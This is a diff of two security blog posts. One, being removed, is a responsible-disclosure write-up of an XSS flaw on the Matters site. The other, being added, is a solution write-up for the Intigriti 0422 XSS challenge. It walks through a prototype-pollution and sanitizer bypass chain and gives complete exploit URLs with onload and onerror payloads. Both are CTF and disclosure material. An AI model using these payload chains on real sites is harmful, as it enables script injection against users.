@@ -1,95 +1,114 @@
-Another way is to restrict the location of the iframe src, which can be done at different levels. For example, filtering src in the code and only allowing specific domains, or using `CSP:frame-src` to let the browser block domains that do not comply.
+``` js
+function checkHost() {
+  const temp = location.host.split(':')
+  const hostname = temp[0]
+  const port = Number(temp[1]) || 443
+  return hostname === 'localhost' || port === 8080
+}
+```
 
-## The second issue: Unfiltered HTML
+It seems invulnerable, but what if `location.host` has no port?
 
-The first issue can cause the biggest danger, probably just a redirect (the codimd article says that XSS can be done in Safari, but I can't do it QQ). However, there is a bigger problem besides this, which is here:
+For example, assumed `location.host` is `intigriti.io`, then `temp` becomes `['intigriti.io']`, and `temp[1]` is `undefined` because the length of the array is 1.
+
+Here comes a cool way to bypass the check, what if `Array.prototype[1]` has been polluted? 
+
+The JavaScript engine will look up `Array.prototype[1]` since `temp` has no property `1`. So, combined with the step1, we can pollute `Array.prototype[1]` to bypass the check:
+
+```
+config[window-toolbar][constructor][prototype][1]=8080
+```
+
+By the way, I got this idea from another challenge called `vm-calc` made by [@Strellic_](https://twitter.com/Strellic_) in DiceCTF 2022, kudos to the creator.
+
+### Step3. Override innerHTML
+
+After bypass the check, we have another merge call:
 
 ``` js
-<>
-  <div
-    className={classNames({ 'u-content': true, translating })}
-    dangerouslySetInnerHTML={{
-      __html: optimizeEmbed(translation || article.content),
-    }}
-    onClick={captureClicks}
-    ref={contentContainer}
-  />
+let devSettings = Object.create(null)
+devSettings["root"] = document.createElement('main')
+devSettings["isDebug"] = false
+devSettings["location"] = 'challenge-0422.intigriti.io'
+devSettings["isTestHostOrPort"] = false
 
-  <style jsx>{styles}</style>
-</>
+if (checkHost()) {
+  devSettings["isTestHostOrPort"] = true
+  merge(devSettings, qs.settings)
+}
 ```
 
-`article.content` is an HTML string filtered by js-xss, so it is safe. However, here it goes through an `optimizeEmbed` to do custom conversion, which is a more dangerous thing to do after filtering, because if there is negligence in the process, it will cause an XSS vulnerability.
+`devSettings["root"]` is an HTML element, so we can use `?settings[root][innerHTML]` to set it's innerHTML and try to perform XSS.
 
-In the conversion, there is a piece of code:
+But, it's not gonna work for two reasons.
 
-``` html
-<source
-  type="image/webp"
-  media="(min-width: 768px)"
-  srcSet=${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}
-  onerror="this.srcset='${src}'"
-/>
+First, there is a `sanitize` function for filtering `<` and `>`.
+
+Second, the element only inserted to DOM after `m.mount()`, the content will be override by mithril.js
+
+
+For the first issue, we can resolve it by using a bug in `sanitize` function:
+
+``` js
+function sanitize(data) {
+  if (typeof data !== 'string') return data
+  return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
+}
 ```
 
-Looking closely at this code, if `${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}` or `src` can be controlled, there is a chance to change the content of the attribute or add a new attribute.
+What if `data` is an array? For example, `['<a>hello</a>']`?
 
-I originally wanted to insert a malicious src to make onerror become `onerror="this.srcset='test';alert(1)"` and other code, but I later found that the onerror event of the source under the picture seems to be invalid, even if there is an error in srcset, it will not trigger, so it is useless.
+Because it's not a string, so it won't be sanitized, the function just return the original value. When you assign this array to `innerHTML`, it casts to string.
 
-Therefore, I focused on srcSet and inserting new attributes. Here, `onanimationstart` can be used, which is an event that will be triggered when the animation starts, and the name of the animation can be found in CSS. Fortunately, I found a keyframe called `spinning`.
+So, we can use `?settings[root][innerHTML][0]=<svg onload=alert(1)>` to bypass the sanitizer.
 
-So if the img src is: `https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)`
+We are close to the end but need to address the last issue. The content of the element will be override by `m.mount` so our payload in `innerHTML` won't work, how should we resolve this?
 
-The combined code is:
+The idea is simple, what if we can set `innerHTML` to `document.body` instead of `<main>`? Then our payload won't be override by mithril.js
 
-``` html
-<source
-  type="image/webp"
-  media="(min-width: 768px)"   
-  srcSet=https://assets.matters.news/processed/1080w/embed/test 
-  style=animation-name:spinning 
-  onanimationstart=console.log(1337)
-  onerror="this.srcset='${src}'"
-/>
+There is a property called ownerDocument, we can access `document` via this.
+
+So, we can set innerHTML on body and perform XSS this way:
+
+```
+config[window-toolbar][constructor][prototype][1]=8080
+settings[root][ownerDocument][body][innerHTML][0]=<svg onload=alert(document.domain)>
 ```
 
-In this way, an XSS vulnerability is created:
+URL:
+https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][body][innerHTML][0]=%3Cstyle%20onload%3Dalert(document.domain)%3E
 
-![](/img/prevent-xss/xss1.png)
-![](/img/prevent-xss/xss2.png)
+There is another magic to solve the issue without overriding `document.body.innerHTML`.
 
-There are several ways to fix it:
+As pointed out [here](https://github.com/terjanq/Tiny-XSS-Payloads/blob/5e8603974ef878e1230ae05e7f79b9467d862e2c/payloads.js#L93), `<img src=x onerror=alert(1)>` works even before inserted into the DOM. We can use this magic to set `root.innerHTML` and get XSS.
 
-1. Add a CSP header to prevent the execution of inline scripts (this is more difficult to achieve because it may conflict with existing things and requires more time to process).
-2. Filter the img url passed in (there is still a risk if the filtering is not done well).
-3. Change the HTML first and then call js-xss to filter out the attributes that should not exist.
+URL:
+https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][innerHTML][0]=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
 
-## Summary
+## Plot twist
 
-We found two vulnerabilities:
+What if I told you that all the solutions above are unintended?
 
-1. Redirect users to any location through `<iframe>`
-2. Execute an XSS attack on the article page through `<source>`
+The challenge was easier than I thought because I made a few bugs, making the intended solution unnecessary and redundant. It’s like there should be five steps for solving the challenge, but you can solve it in step2 because of the bugs.
 
-What kind of attack can actually be done?
+The challenge should be more complex and interesting.
 
-First, use the second vulnerability to publish an article with an XSS attack, and then write a bot to leave a message under all articles, using `<iframe>` to redirect users to the article with XSS. In this way, as long as the user clicks on any article, they will be attacked.
+So, here comes **the revenge of Intigriti 0422 challenge**!
 
-However, the defense of other parts of the website itself is well done. Although there is XSS, the Cookie is HttpOnly, so it cannot be stolen, and the password modification is sent by email, so the password cannot be modified. It seems that it is not possible to do really serious things.
+I patched the bugs and hosted the fixed challenge on GitHub, here is the challenge URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422
 
-Many libraries that filter XSS are safe (although sometimes there are still vulnerabilities found, such as [bypassing DOMPurify](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)), but people who use the library may ignore some settings or do extra things, resulting in HTML that is still unsafe.
+You can found the diff below:
 
-When dealing with user input, every step should be carefully reviewed to avoid negligence.
+``` diff
+function sanitize(data) {
+- if (typeof data !== 'string') return data
++ if (typeof data !== 'string') data = String(data)
 
-It is also recommended to set up CSP headers as a last line of defense against XSS attacks. Although some CSP rules can be bypassed, it is still better than having nothing.
+function merge(target, source) {
+- let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]
++ let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m", "Object"]
+```
 
-Matters has its own Bug Bounty Program, which offers rewards for finding vulnerabilities that can prove harmful. The XSS vulnerability found in this article is classified as High, with a value of $150 USD. The team believes that open source can benefit technical professionals and make websites more secure, so they hope everyone knows about this program.
+The revenge of Intigriti 0422 challenge runs until `2022-05-01T23:59:59+00:00`, you can DM me on [Twitter](https://twitter.com/aszx87410) if you find the solution.
 
-Finally, thanks to the Matters team for their quick response and handling, and thanks to the colleagues at Cymetrics.
-
-Timeline:
-
-- May 7, 2021: Vulnerability reported
-- May 12, 2021: Received confirmation from the Matters team that they are fixing the vulnerability
-- May 12, 2021: Asked for permission to publish the article after the fix, received permission
-- May 13, 2021: Fix completed
+Please noted that the revenge of Intigriti 0422 challenge is a challenge **hosted by my own, not Intigriti**, so there is no swag voucher for the winners.
